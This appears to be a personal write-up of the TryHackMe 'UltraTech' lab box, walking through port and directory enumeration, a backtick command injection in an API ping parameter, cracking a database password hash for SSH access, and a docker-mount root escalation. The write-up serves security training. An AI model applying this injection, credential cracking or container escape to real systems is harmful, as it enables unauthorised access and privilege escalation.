---
date: 2024-10-20
title: UltraTech THM Write-Up
machine_ip: varies
os: Linux
difficulty: Medium
my_rating: 3
tags:
  - Linux
  - PrivEsc
  - docker
  - rustscan
  - feroxbuster
  - Apache
  - Node
  - ssh
  - FTP
  - GTFOBins
references: "[[📚CTF Box Writeups]]"
---

# Enumeration


- Rustscan
```
┌──(root㉿kali)-[~/Transfer]
└─# rustscan -a 10.10.39.172 -t 2000 -b 2000 -- -A -sVC -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛

[~] The config file is expected to be at "/root/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.39.172:21
Open 10.10.39.172:22
Open 10.10.39.172:8081
Open 10.10.39.172:31331
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -A -sVC -Pn" on ip 10.10.39.172
Depending on the complexity of the script, results may take some time to appear.
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-20 15:11 PDT
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 15:11
Completed NSE at 15:11, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 15:11
Completed NSE at 15:11, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 15:11
Completed NSE at 15:11, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 15:11
Completed Parallel DNS resolution of 1 host. at 15:11, 0.03s elapsed
DNS resolution of 1 IPs took 0.03s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 15:11
Scanning 10.10.39.172 [4 ports]
Discovered open port 22/tcp on 10.10.39.172
Discovered open port 31331/tcp on 10.10.39.172
Discovered open port 21/tcp on 10.10.39.172
Discovered open port 8081/tcp on 10.10.39.172
Completed SYN Stealth Scan at 15:11, 0.17s elapsed (4 total ports)
Initiating Service scan at 15:11
Scanning 4 services on 10.10.39.172
Completed Service scan at 15:11, 11.50s elapsed (4 services on 1 host)
Initiating OS detection (try #1) against 10.10.39.172
Retrying OS detection (try #2) against 10.10.39.172
Initiating Traceroute at 15:11
Completed Traceroute at 15:11, 3.02s elapsed
Initiating Parallel DNS resolution of 2 hosts. at 15:11
Completed Parallel DNS resolution of 2 hosts. at 15:11, 0.03s elapsed
DNS resolution of 2 IPs took 0.03s. Mode: Async [#: 1, OK: 0, NX: 2, DR: 0, SF: 0, TR: 2, CN: 0]
NSE: Script scanning 10.10.39.172.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 15:11
Completed NSE at 15:11, 7.48s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 15:11
Completed NSE at 15:11, 4.56s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 15:11
Completed NSE at 15:11, 0.00s elapsed
Nmap scan report for 10.10.39.172
Host is up, received user-set (0.17s latency).
Scanned at 2024-10-20 15:11:22 PDT for 32s

PORT      STATE SERVICE REASON         VERSION
21/tcp    open  ftp     syn-ack ttl 61 vsftpd 3.0.3
22/tcp    open  ssh     syn-ack ttl 61 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc:66:89:85:e7:05:c2:a5:da:7f:01:20:3a:13:fc:27 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDiFl7iswZsMnnI2RuX0ezMMVjUXFY1lJmZr3+H701ZA6nJUb2ymZyXusE/wuqL4BZ+x5gF2DLLRH7fdJkdebuuaMpQtQfEdsOMT+JakQgCDls38FH1jcrpGI3MY55eHcSilT/EsErmuvYv1s3Yvqds6xoxyvGgdptdqiaj4KFBNSDVneCSF/K7IQdbavM3Q7SgKchHJUHt6XO3gICmZmq8tSAdd2b2Ik/rYzpIiyMtfP3iWsyVgjR/q8oR08C2lFpPN8uSyIHkeH1py0aGl+V1E7j2yvVMIb4m3jGtLWH89iePTXmfLkin2feT6qAm7acdktZRJTjaJ8lEMFTHEijJ
|   256 c3:67:dd:26:fa:0c:56:92:f3:5b:a0:b3:8d:6d:20:ab (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLy2NkFfAZMY462Bf2wSIGzla3CDXwLNlGEpaCs1Uj55Psxk5Go/Y6Cw52NEljhi9fiXOOkIxpBEC8bOvEcNeNY=
|   256 11:9b:5a:d6:ff:2f:e4:49:d2:b5:17:36:0e:2f:1d:2f (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEipoohPz5HURhNfvE+WYz4Hc26k5ObMPnAQNoUDsge3
8081/tcp  open  http    syn-ack ttl 61 Node.js Express framework
|_http-cors: HEAD GET POST PUT DELETE PATCH
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
31331/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.29 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: 15C1B7515662078EF4B5C724E2927A96
|_http-title: UltraTech - The best of technology (AI, FinTech, Big Data)
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.16 (95%), Linux 3.10 - 3.13 (94%), Linux 3.1 (93%), Linux 3.2 (93%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (93%), Linux 3.2 - 4.9 (93%), Linux 3.8 - 4.14 (93%), Linux 4.4 - 4.9 (93%), Synology DiskStation Manager 5.2-5644 (93%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.94SVN%E=4%D=10/20%OT=21%CT=%CU=36429%PV=Y%DS=4%DC=T%G=N%TM=6715802A%P=x86_64-pc-linux-gnu)
SEQ(SP=F9%GCD=1%ISR=103%TI=Z%II=I%TS=A)
SEQ(SP=F9%GCD=1%ISR=103%TI=Z%CI=I%II=I%TS=A)
OPS(O1=M509ST11NW6%O2=M509ST11NW6%O3=M509NNT11NW6%O4=M509ST11NW6%O5=M509ST11NW6%O6=M509ST11)
WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)
ECN(R=Y%DF=Y%T=40%W=6903%O=M509NNSNW6%CC=Y%Q=)
T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)
IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 3.439 days (since Thu Oct 17 04:40:27 2024)
Network Distance: 4 hops
TCP Sequence Prediction: Difficulty=249 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT       ADDRESS
1   82.24 ms  10.6.0.1
2   ... 3
4   157.18 ms 10.10.39.172

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 15:11
Completed NSE at 15:11, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 15:11
Completed NSE at 15:11, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 15:11
Completed NSE at 15:11, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 32.00 seconds
           Raw packets sent: 63 (4.392KB) | Rcvd: 42 (3.152KB)
```
- we find #FTP #SSH and two web servers
	- #Node and #Apache 
	- UltraTech API v0.1.3 shown on port 8081
	- The real website shown on port 31331
		- (Real-life) meta information :
			- Theme created by Katerina Limpitsouni (https://twitter.com/ninalimpi)
			- Theme code/design by Aggelos Gesoulis (https://twitter.com/anges244)


- Web enumeration
	- feroxbuster - port 31331
```
┌──(root㉿kali)-[~/Transfer]
└─# feroxbuster -r -k --url http://10.10.39.172:31331
                                                                                                                                                            
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.39.172:31331
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 📍  Follow Redirects      │ true
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       32w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET       11l       32w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      139l      531w     6092c http://10.10.39.172:31331/index.html
200      GET        1l      530w    10496c http://10.10.39.172:31331/images/undraw_browser.svg
200      GET        1l      203w     8500c http://10.10.39.172:31331/images/undraw_designer.svg
200      GET        1l      396w     8929c http://10.10.39.172:31331/images/undraw_responsive.svg
200      GET       65l      229w     2534c http://10.10.39.172:31331/what.html
200      GET        4l      328w    24710c http://10.10.39.172:31331/css/style.min.css
200      GET        1l      178w    19165c http://10.10.39.172:31331/js/app.min.js
200      GET     1393l     3543w    30017c http://10.10.39.172:31331/css/style.css
200      GET       17l       69w     1138c http://10.10.39.172:31331/css/
200      GET      139l      531w     6092c http://10.10.39.172:31331/
200      GET        1l      265w     4599c http://10.10.39.172:31331/images/together.svg
200      GET        1l      155w    12953c http://10.10.39.172:31331/images/tet.svg
200      GET      240l     1315w   107517c http://10.10.39.172:31331/images/hero_sm.png
200      GET        1l     2326w    63504c http://10.10.39.172:31331/images/undraw_fans.svg
200      GET        1l      307w     9407c http://10.10.39.172:31331/images/undraw_selfie.svg
200      GET        1l      685w    14849c http://10.10.39.172:31331/images/undraw_elements.svg
200      GET        1l      327w    11819c http://10.10.39.172:31331/images/undraw_hello_aeia.svg
200      GET        1l      677w    14561c http://10.10.39.172:31331/images/undraw_tabs.svg
200      GET      206l      773w    77520c http://10.10.39.172:31331/images/evie_default_bg.jpeg
200      GET        1l      661w    19350c http://10.10.39.172:31331/images/undraw_frameworks.svg
200      GET        1l      443w    11824c http://10.10.39.172:31331/images/undraw_creation.svg
200      GET        0l        0w    18240c http://10.10.39.172:31331/images/undraw_everywhere.svg
200      GET       31l      205w     4170c http://10.10.39.172:31331/images/
200      GET    10253l    40948w   268026c http://10.10.39.172:31331/javascript/jquery/jquery
```
- The software using the port 8081 is a REST api
	- navigate to `/js/api.js` to see
- feroxbuster port 8081
```
┌──(root㉿kali)-[~/Transfer]
└─# feroxbuster -r -k --url http://10.10.39.172:8081 
                                                                                                                                                            
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.39.172:8081
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 📍  Follow Redirects      │ true
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET       10l       15w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET        1l        3w       20c http://10.10.39.172:8081/
200      GET        1l        8w       39c http://10.10.39.172:8081/auth

```

- Manually enumerating port 31331
	- we find the `/robots.txt`
```
Allow: *
User-Agent: *
Sitemap: /utech_sitemap.txt
```
- navigating to `/utech_sitemap.txt`, we find:
```
/
/index.html
/what.html
/partners.html
```
- `/partners.html` was not discovered from tools. 
	- navigating here, we see a login page!
	- comparing the `/ping` and `/js/api.js` scripts, we may be able to get code execution
```
http://10.10.35.170:8081/ping?ip=`ls`
```
- shows us a database file in the directory
	- `utech.db.sqlite`
	- ==Note: back tickes are processed first. So ping command is sent second after the ls==
	- When we `cat utech.db.sqlite`, we get what appears to be a hash?
```
ping: ) ���(Mr00tf357a0c52799563c7c7b76c1e7543a32)Madmin0d0ea5111e3c1def594c1684e3b9be84: Parameter string not correctly encoded 
```
- `f357a0c52799563c7c7b76c1e7543a32`
	- try to crack with hashcat or [crackstation](https://crackstation.net/)
- `n100906` is cracked hash
	- with credentials, we can try to login to ssh using `r00t:n100906`

---
# Foothold

- using ssh, we login
```
┌──(root㉿kali)-[~/Transfer]
└─# ssh r00t@10.10.35.170
r00t@10.10.35.170's password: 
Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 4.15.0-46-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

 System information disabled due to load higher than 1.0

 * Ubuntu's Kubernetes 1.14 distributions can bypass Docker and use containerd
   directly, see https://bit.ly/ubuntu-containerd or try it now with

     snap install microk8s --channel=1.14/beta --classic

1 package can be updated.
0 updates are security updates.



The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

r00t@ultratech-prod:~$ whoami
r00t
```

---
# PrivEsc

- knowing this is part of the docker section in Linux_PrivEsc, I utilize HackTricks
- `find / -name docker.sock 2>/dev/null`
	- we find `/run/docker.sock`
- identify images
```
r00t@ultratech-prod:~$ docker images
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
bash                latest              495d6437fc1e        5 years ago         15.8MB
```
- Having explored HackTricks, I use GTFOBins and find an exploit that gives me a root `/bin/bash`
```
r00t@ultratech-prod:/$ docker run -v /:/mnt --rm -it bash chroot /mnt sh
# whoami
root
```

- Improve shell: `python3 -c 'import pty;pty.spawn("/bin/bash")'`
- Found #ssh keys in root folder
```
root@349266c76c7f:~/.ssh# ll
total 16
drwx------ 2 root root 4096 Mar 22  2019 ./
drwx------ 6 root root 4096 Mar 22  2019 ../
-rw------- 1 root root    0 Mar 19  2019 authorized_keys
-rw------- 1 root root 1675 Mar 22  2019 id_rsa
-rw-r--r-- 1 root root  401 Mar 22  2019 id_rsa.pub
```
- With the first 9 characters from `id_rsa` we can answer the last flag and complete the box